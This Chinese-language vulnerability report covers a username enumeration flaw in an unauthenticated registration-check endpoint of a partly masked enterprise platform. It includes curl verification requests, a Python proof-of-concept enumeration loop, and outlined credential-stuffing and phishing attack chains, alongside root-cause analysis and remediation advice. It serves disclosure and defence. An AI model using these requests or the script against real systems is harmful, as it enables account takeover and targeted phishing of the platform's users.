---
layout: about
category: about
Researchname: 「poseidon3」：用户名枚举漏洞
toc: true
author: Bin4xin
permalink: /about/poseidon3-username-enumeration/
desc: 「poseidon3」
---

{% include common-index/index-preset.html level="error" msg="本文所述漏洞仅用于安全研究与合规审计目的，任何未授权的渗透测试或恶意利用行为均违反相关法律法规，后果由使用者自行承担。<br>本文所涉及漏洞信息仅供授权安全研究与合规审计使用，任何未经授权的测试或恶意利用均属违法行为。" %}

# 用户名枚举漏洞

{: .table}
| 字段 | 内容 |
|------|------|
| **报告编号** | VULN-OMS-2026-004 |
| **漏洞等级** | <span style="color:#bc6f00;font-weight:bold">🟠 中危</span> |
| **漏洞类型** | 用户名枚举 (Username Enumeration) |
| **目标系统** | example-poseidon3.*****.com (Poseidon3企业应用平台) |
| **发现日期** | 2026-07-07 |
| **影响服务** | po-server（门户服务） |

---

## 1. 漏洞概述

Poseidon3企业应用平台的用户名检查接口 `/portal/member/userRegister/checkUserName` 无需任何身份认证即可访问，且对已注册和未注册的用户名返回不同的响应结果。攻击者可利用该接口枚举系统中有效的用户名，为后续暴力破解、撞库攻击和社会工程攻击提供目标名单。该漏洞属于OWASP Top 10中 `A07:2021 - Identification and Authentication Failures` 类别。

{% include common-index/index-preset.html level="warn" msg="用户名检查接口无需认证即可访问，且对已注册和未注册用户名返回差异化响应，攻击者可零成本枚举系统中所有有效用户名。" %}

---

## 2. 漏洞位置

### 2.1 接口地址

```
POST https://example-poseidon3.*****.com/po-server/portal/member/userRegister/checkUserName
```

### 2.2 前端调用代码

在前端构建产物中发现如下调用逻辑：

```javascript
// pages.e7b00d27.js
poServer.post("/portal/member/userRegister/checkUserName", params);
```

### 2.3 服务归属

该接口由 `po-server`（门户服务）承载，未被CAS SSO保护，且接口层面无独立认证机制。

{% include common-index/index-preset.html level="info" msg="提示：po-server 服务下的 portal/member/userRegister 路径组整体均未被 CAS SSO 保护，除本接口外，同路径下的 registerSubmit 接口同样存在未授权访问问题（详见「用户注册接口未授权访问」报告）。" %}

---

## 3. 泄露内容分析

### 3.1 响应差异

接口通过返回不同的响应内容区分已注册和未注册的用户名：

{: .table}
| 请求用户名 | 响应状态 | 含义 |
|-----------|----------|------|
| `admin` | 返回"用户名已存在"或特定状态码 | <span style="color:#cf222e;font-weight:bold">🔴 用户名有效（已注册）</span> |
| `nonexistuser12345` | 返回"用户名可用"或不同状态码 | <span style="color:#1f7bdf">🔵 用户名不存在</span> |

### 3.2 敏感字段解读

{: .table}
| 信息 | 攻击利用价值 |
|------|-------------|
| 有效用户名列表 | <span style="color:#cf222e;font-weight:bold">🔴 作为暴力破解的输入字典</span> |
| 系统用户命名规则 | <span style="color:#bc6f00;font-weight:bold">🟠 推断用户名生成模式（如姓名拼音、工号等）</span> |
| 账号存在性确认 | <span style="color:#bc6f00;font-weight:bold">🟠 用于定向钓鱼攻击和社会工程</span> |

{% include common-index/index-preset.html level="error" msg="警告：用户名枚举是暴力破解和撞库攻击的关键前置步骤，一旦有效用户名列表泄露，攻击者可大幅缩小密码爆破范围，提高攻击成功率。" %}

---

## 4. 漏洞验证

### 4.1 验证请求

{% details 👉 curl 验证请求（测试已知用户名） %}

```bash
# 测试已知用户名
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/userRegister/checkUserName" \
  -H "Content-Type: application/json" \
  -d '{"userName":"admin"}'
```

{% enddetails %}

{% details 👉 curl 验证请求（测试不存在的用户名） %}

```bash
# 测试不存在的用户名
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/userRegister/checkUserName" \
  -H "Content-Type: application/json" \
  -d '{"userName":"nonexistuser12345"}'
```

{% enddetails %}

### 4.2 验证要点

- 请求未携带任何认证Cookie、Session Token或JWT
- 服务端返回HTTP 200状态码，未返回401/403
- 两次请求的响应内容存在明显差异，可区分用户名是否存在

{% include common-index/index-preset.html level="warn" msg="注意：验证过程应在授权范围内进行，枚举到的有效用户名不应被用于未授权的暴力破解或撞库攻击。" %}

---

## 5. 攻击场景

### 5.1 用户名字典爆破

{% details 👉 用户名枚举 PoC 代码（Python） %}

```python
import requests
import json

url = "https://example-poseidon3.*****.com/po-server/portal/member/userRegister/checkUserName"
common_users = ["admin", "administrator", "root", "test", "guest",
                "sysadmin", "operator", "user01", "zhangsan", "lisi"]

for user in common_users:
    resp = requests.post(url, json={"userName": user}, verify=False)
    if "已存在" in resp.text or resp.json().get("code") == "00001":
        print(f"[+] 有效用户名: {user}")
```

{% enddetails %}

### 5.2 撞库攻击前置

{% details 👉 撞库攻击前置步骤 %}

```
1. 枚举出系统中的有效用户名列表
2. 结合互联网泄露的密码字典（如社工库）
3. 利用 Spring Security 登录接口进行撞库攻击
4. 由于验证码未启用(checkVerifyCode=0)，可自动化大规模尝试
```

{% enddetails %}

### 5.3 社会工程攻击

{% details 👉 社会工程攻击步骤 %}

```
1. 枚举出企业内部员工的真实用户名
2. 推断员工姓名、部门等信息
3. 构造定向钓鱼邮件或电话诈骗
4. 利用企业内部信任关系获取更多敏感信息
```

{% enddetails %}

### 5.4 完整攻击链

```
枚举用户名(checkUserName) → 撞库/暴力破解(Spring Security登录) → 获取合法Session → 访问业务接口 → 数据窃取/篡改
```

{% include common-index/index-preset.html level="warn" msg="攻击链说明：用户名枚举是暴力破解和撞库攻击的关键前置步骤，结合系统验证码未启用（checkVerifyCode=0）的弱点，攻击者可自动化大规模尝试登录。" %}

---

## 6. 根因分析

{: .table}
| 层级 | 问题 |
|------|------|
| **架构层** | po-server 未被CAS SSO保护 |
| **代码层** | 接口未做认证检查，响应差异化暴露用户存在性 |
| **设计层** | 用户注册流程设计缺陷，将用户名检查暴露给未认证用户 |
| **配置层** | Spring Security 未将 `/portal/member/userRegister/checkUserName` 纳入认证保护 |

{% include common-index/index-preset.html level="info" msg="提示：根因在于「无认证访问 + 响应差异化」的双重缺陷。仅添加认证而不统一响应内容，仍可能被已登录用户枚举；仅统一响应而不添加认证，则未登录用户仍可探测。建议双管齐下。" %}

---

## 7. 影响评估

{: .table}
| 维度 | 影响 |
|------|------|
| **机密性** | <span style="color:#bc6f00;font-weight:bold">🟠 中</span> — 泄露系统有效用户名 |
| **完整性** | <span style="color:#1f7bdf">🔵 低</span> — 不直接导致数据篡改 |
| **可用性** | <span style="color:#1f7bdf">🔵 低</span> — 不直接影响系统可用性 |
| **业务影响** | <span style="color:#bc6f00;font-weight:bold">🟠 中</span> — 为暴力破解和撞库攻击提供前提条件 |

---

## 8. 修复建议

### 8.1 紧急修复（P0）

{% include common-index/index-preset.html level="error" msg="紧急：用户名枚举漏洞是暴力破解和撞库攻击的关键前置条件，建议在发现漏洞后 24 小时内完成 P0 级修复。" %}

1. **统一响应内容**：无论用户名是否存在，接口返回相同的响应内容和状态码，消除差异性。
2. **添加认证要求**：将 `/portal/member/userRegister/checkUserName` 纳入认证保护范围，仅已登录用户可调用。

### 8.2 短期加固（P1）

1. **频率限制**：对同一IP地址的用户名检查请求实施频率限制（如每分钟最多10次）。
2. **延迟响应**：对用户名检查请求添加随机延迟（如200ms-500ms），增加枚举攻击的时间成本。
3. **监控告警**：对高频用户名检查行为进行监控，触发阈值时自动告警并临时封锁IP。

{% include common-index/index-preset.html level="info" msg="提示：P1 级修复建议在漏洞发现后 7 个工作日内完成，并在修复完成后进行回归测试，确认注册流程功能正常。" %}

### 8.3 长期加固（P2）

1. **移除前端检查**：将用户名唯一性检查移至注册流程的认证阶段，不在未认证状态下暴露。
2. **使用模糊提示**：注册页面使用"该用户名格式不符合要求"等模糊提示，而非"用户名已存在"。
3. **WAF规则**：在WAF中添加用户名枚举检测规则，自动拦截异常高频请求。

---

## 9. 参考标准

- [OWASP Top 10 2021: A07 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/){:target="_blank"}
- [CWE-203: Observable Discrepancy](https://cwe.mitre.org/data/definitions/203.html){:target="_blank"}
- [CWE-204: Observable Response Discrepancy](https://cwe.mitre.org/data/definitions/204.html){:target="_blank"}
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html){:target="_blank"}
- GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求

---

**报告日期：** 2026-07-07